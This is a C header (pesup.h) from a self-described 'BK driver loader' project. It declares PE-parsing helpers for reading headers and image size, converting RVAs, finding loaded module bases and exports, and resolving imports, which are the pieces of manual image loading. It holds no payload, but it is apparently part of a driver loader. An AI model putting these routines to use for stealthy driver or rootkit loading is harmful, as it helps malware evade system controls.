//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: pesup.h
// description: 
//	BK helper library. PE-structure support routines.

#pragma once
#include <winnt.h>


typedef ULONG_PTR	IAT_ENTRY;
typedef IAT_ENTRY*	PIAT_ENTRY;

typedef ULONG			EXPORT_ENTRY;
typedef EXPORT_ENTRY*	PEXPORT_ENTRY;


_inline PVOID PeSupGetImagePeHeader(PCHAR DosHeader)
{
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(DosHeader + ((PIMAGE_DOS_HEADER)DosHeader)->e_lfanew);
	return((PVOID)pe);
}


#define		PeSupGetOptionalField(PeHeader, Field)												\
				(FIELD_OFFSET(IMAGE_OPTIONAL_HEADER32, ##Field) != FIELD_OFFSET(IMAGE_OPTIONAL_HEADER64, ##Field) && \
				((PIMAGE_NT_HEADERS32)PeHeader)->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ?	\
				((PIMAGE_NT_HEADERS64)PeHeader)->OptionalHeader.##Field :								\
				((PIMAGE_NT_HEADERS32)PeHeader)->OptionalHeader.##Field)


_inline ULONG PeSupGetImageSize(PCHAR DosHeader)
{
	PIMAGE_NT_HEADERS32		PEHeader32	= (PIMAGE_NT_HEADERS32)PeSupGetImagePeHeader(DosHeader);
	PIMAGE_NT_HEADERS64		PEHeader64	= (PIMAGE_NT_HEADERS64)PEHeader32;
	ULONG	ImageSize;

	if (PEHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		ImageSize = PEHeader64->OptionalHeader.SizeOfImage;
	else
		ImageSize = PEHeader32->OptionalHeader.SizeOfImage;

	return(ImageSize);
}


_inline PVOID PeSupRvaToVa(ULONG Rva, PCHAR ImageBase)
{
	return((PVOID)((ULONG_PTR)Rva + (ULONG_PTR)ImageBase));

}


#define	PeSupAlign(Size, Alingment)		((Size + (Alingment - 1)) & (~(Alingment - 1 )))


// Retrieves a module base for the specified module from the specified list of loaded modules.
PVOID	PeSupGetModuleBase(
					   PLIST_ENTRY	LoadedModuleList,
					   PCHAR		ModuleName
					   );

// Retrieves the address of an exported function or variable from the specified module.
PVOID	PeSupGetFunctionAddress(
						PVOID		ImageBase,			// target module base
						PCHAR		FunctionName		// target function name
						);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Resolves specified image import based on the specified list of loaded modules.
NTSTATUS	PeSupResolveImageImport(
						PVOID		LoadedModuleList,
					    PVOID		ImageBase
						);

